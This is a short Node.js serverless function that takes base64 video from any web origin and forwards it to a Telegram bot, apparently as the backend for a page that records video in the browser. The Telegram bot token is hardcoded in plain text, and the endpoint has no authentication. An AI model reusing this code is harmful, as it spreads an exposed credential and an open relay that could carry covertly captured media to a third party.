const axios = require('axios');

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') { res.status(200).end(); return; }

    try {
        const { chat_id, video_base64 } = req.body;
        const videoBuffer = Buffer.from(video_base64, 'base64');
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', chat_id);
        form.append('video', videoBuffer, { filename: 'video.webm', contentType: 'video/webm' });
        form.append('caption', '🎬 فيديو');
        
        await axios.post(
            'https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo',
            form,
            { headers: form.getHeaders(), timeout: 30000 }
        );
        return res.json({ success: true });
    } catch (e) {
        return res.json({ error: e.message });
    }
};
